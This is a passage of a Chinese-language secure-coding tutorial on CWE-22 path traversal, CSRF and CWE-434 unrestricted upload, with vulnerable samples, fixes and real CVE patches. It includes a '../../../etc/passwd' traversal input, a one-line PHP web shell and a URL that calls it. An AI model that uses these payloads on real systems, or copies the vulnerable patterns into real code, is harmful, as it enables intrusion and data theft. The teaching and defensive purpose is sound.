</code></pre></div></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noreferrer">【B】CWE-22: Improper Limitation of a Pathname to a Restricted Directory (&#x27;Path Traversal&#x27;)</a></h3><p class="x-p">“路径遍历”，产品使用外部输入来构建路径名，该路径名旨在识别位于受限父目录下的文件或目录。但通过使用特殊元素如<code class="x-inline-highlight">../</code>序列，如果没有经过中和处理，攻击者可能会访问到受限目录之外的文件。</p><p class="x-p">上述风险称为“相对路径遍历”，路径遍历还包括使用绝对路径名，例如<code class="x-inline-highlight">/usr/local/bin</code>，这称为“绝对路径遍历”。</p><p class="x-p">在许多编程语言中，注入空字节可能允许攻击者截断生成的文件名，以扩大攻击范围。例如，产品可能会将<code class="x-inline-highlight">".txt"</code>添加到路径名后以限制攻击者只能访问文本文件，但空注入可能会有效地消除此限制。</p><h4 class="x-h3">Example 1</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Perl</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">my</span> <span class="token variable">$dataPath</span> <span class="token operator">=</span> <span class="token string">"/users/cwe/profiles"</span><span class="token punctuation">;</span>
<span class="token keyword">my</span> <span class="token variable">$username</span> <span class="token operator">=</span> param<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">my</span> <span class="token variable">$profilePath</span> <span class="token operator">=</span> <span class="token variable">$dataPath</span><span class="token operator">.</span><span class="token string">"/"</span><span class="token operator">.</span><span class="token variable">$username</span><span class="token punctuation">;</span>

open<span class="token punctuation">(</span><span class="token keyword">my</span> <span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token variable">$profilePath</span><span class="token punctuation">)</span> <span class="token operator">||</span> ExitError<span class="token punctuation">(</span><span class="token string">"profile read error: $profilePath"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">print</span> <span class="token string">"&lt;ul>\n"</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token variable">$fh</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">print</span> <span class="token string">"&lt;li>$_&lt;/li>\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">print</span> <span class="token string">"&lt;/ul>\n"</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p"><code class="x-inline-highlight">$username</code>参数没有验证，攻击者可以构造：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>user=../../../etc/passwd</code></pre></div><p class="x-p">最终生成以下路径：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>/users/cwe/profiles/../../../etc/passwd</code></pre></div><p class="x-p">等同于访问<code class="x-inline-highlight">/etc/passwd</code>。</p><h4 class="x-h3">Example 2</h4><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">import</span> os
<span class="token keyword">import</span> sys
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    filename <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            file_data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> FileNotFoundError <span class="token keyword">as</span>    e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error - file not found"</span><span class="token punctuation">)</span>
main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><p class="x-p">上述代码会导致“绝对路径遍历”，<code class="x-inline-highlight">os.path.join</code>如果第二个参数传入绝对路径，则会弃用第一个参数<code class="x-inline-highlight">os.getcwd()</code>，直接使用第二个参数<code class="x-inline-highlight">filename</code>。那么传入<code class="x-inline-highlight">/etc/passwd</code>就可能导致同样的攻击。</p><p class="x-p">一个正确的做法是：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 120px, var(--bg-transparent-golden) 120px 144px, transparent 144px)"><code><span class="token keyword">import</span> os
<span class="token keyword">import</span> sys
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    filename <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>normpath<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>os<span class="token punctuation">.</span>sep<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>filename<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            file_data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> FileNotFoundError <span class="token keyword">as</span>    e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error - file not found"</span><span class="token punctuation">)</span>
main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2023-35947" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2023-35947</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/gradle/gradle/commit/1096b309520a8c315e3b6109a6526de4eabcb879" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/gradle/gradle/commit/1096b309520a8c315e3b6109a6526de4eabcb879</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/gradle/gradle/commit/2e5c34d57d0c0b7f0e8b039a192b91e5c8249d91" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/gradle/gradle/commit/2e5c34d57d0c0b7f0e8b039a192b91e5c8249d91</a></p></div></div><p class="x-p">Gradle是一款构建工具，侧重于构建自动化和多语言开发支持。在受影响的版本中，当解压Tar压缩包时，Gradle不会检查文件是否可以写入解压位置之外。这可能导致重要文件在Gradle进程有写入权限的任何地方被覆盖。</p><p class="x-p">部分补丁的内容：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Java</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 24px, var(--bg-transparent-red) 24px 48px, transparent 48px, transparent 48px, var(--bg-transparent-green) 48px 72px, transparent 72px)"><code><span class="token class-name">String</span> path <span class="token operator">=</span> tarEntry<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">String</span> path <span class="token operator">=</span> <span class="token function">safeEntryName</span><span class="token punctuation">(</span>tarEntry<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p class="x-p">进一步去查找<code class="x-inline-highlight">safeEntryName()</code>的功能，溯源到<a href="https://github.com/gradle/gradle/blob/master/platforms/core-runtime/files/src/main/java/org/gradle/internal/file/PathTraversalChecker.java" target="_blank" rel="noreferrer" class="x-inline-link">PathTraversalChecker.java</a>中的以下代码：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Java</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 504px, var(--bg-transparent-golden) 504px 672px, transparent 672px)"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PathTraversalChecker</span> <span class="token punctuation">{</span>

    <span class="token comment">/**
     * Checks the entry name for path traversal vulnerable sequences.
     *
     * This code is used for path traversal, ZipSlip and TarSlip detection.
     *
     * &lt;b>IMPLEMENTATION NOTE&lt;/b>
     * We do it this way instead of the way recommended in &lt;a href="https://snyk.io/research/zip-slip-vulnerability">&lt;/a>
     * for performance reasons, calling {@link File#getCanonicalPath()} is too expensive.
     *
     * @throws IllegalArgumentException if the entry contains vulnerable sequences
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">safePathName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isUnsafePathName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"'%s' is not a safe archive entry or path name."</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isUnsafePathName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> name<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> name<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> name<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> <span class="token function">containsDirectoryNavigation</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
            <span class="token operator">||</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isWindows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">containsDirectoryNavigation</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>name<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// We have a .. but if not before a file separator or at the end, it is OK</span>
        <span class="token keyword">return</span> name<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"\\.."</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> name<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"..\\"</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> name<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"/.."</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> name<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isWindows</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token class-name">Locale</span><span class="token punctuation">.</span><span class="token constant">US</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"windows"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">其中的核心是高亮的<code class="x-inline-highlight">isUnsafePathName()</code>函数。</p></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/352.html" target="_blank" rel="noreferrer">【Compo】CWE-352: Cross-Site Request Forgery (CSRF)</a></h3><p class="x-p">跨站请求伪造。</p><div class="x-highlightblock highlight-background-gray"><p class="x-p">详见<a href="/24b/cross-site-request-forgery/" target="_blank" rel="noreferrer" class="x-inline-link">Learn CSRF</a>。</p></div><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2009-3022" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2009-3022</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>报告：<a href="https://jvndb.jvn.jp/ja/contents/2009/JVNDB-2009-000058.html" target="_blank" rel="noreferrer" class="x-inline-link">https://jvndb.jvn.jp/ja/contents/2009/JVNDB-2009-000058.html</a></p></div></div><p class="x-p">在bingo!CMS 1.2及更早版本中存在CSRF漏洞，远程攻击者可劫持其他用户对修改配置或更改内容请求的身份验证。</p></div><h3 class="x-h2"><a href="https://cwe.mitre.org/data/definitions/434.html" target="_blank" rel="noreferrer">【B】CWE-434: Unrestricted Upload of File with Dangerous Type</a></h3><p class="x-p">缺少对上传文件类型的验证。</p><h4 class="x-h3">Example 1</h4><p class="x-p">下面的代码中，前端希望用户上传一个图片，<code class="x-inline-highlight">upload_picture.php</code>处理上传的文件，并尝试储存在<code class="x-inline-highlight">pictures/</code>中。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">HTML</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload_picture.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    Choose a file to upload:
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
</code></pre></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token comment">//upload_picture.php</span>
<span class="token operator">...</span>
<span class="token comment">// Define the target location where the picture being</span>
<span class="token comment">// uploaded is going to be saved.</span>
<span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"pictures/"</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploadedfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Move the uploaded file to the new location.</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uploadedfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"The picture has been successfully uploaded."</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span>
<span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"There was an error uploading the picture, please try again."</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre></div><p class="x-p">上述代码的问题是没有检查传入的文件类型，以至于攻击者可以上传一份<code class="x-inline-highlight">malicious.php</code>，并且用它来执行系统代码：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token comment">//malicious.php</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
</code></pre></div><p class="x-p">上传成功后通过类似以下形式的URL调用：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l</code></pre></div><div class="x-highlightblock highlight-background-blue"><h4 class="x-h3">Example in real-world project</h4><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>OpenCVE：<a href="https://www.opencve.io/cve/CVE-2019-1010062" target="_blank" rel="noreferrer" class="x-inline-link">CVE-2019-1010062</a></p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">Patch</code>：<a href="https://github.com/pluck-cms/pluck/commit/09f0ab871bf633973cfd9fc4fe59d4a912397cf8" target="_blank" rel="noreferrer" class="x-inline-link">https://github.com/pluck-cms/pluck/commit/09f0ab871bf633973cfd9fc4fe59d4a912397cf8</a></p></div></div><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">PHP</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre style="background:linear-gradient(180deg, transparent 96px, var(--bg-transparent-green) 96px 216px, transparent 216px)"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">//Check if the file is JPG, PNG or GIF.</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'imagefile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image/pjpeg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">/* fix issue 44. Thanks to Klaus.  */</span>
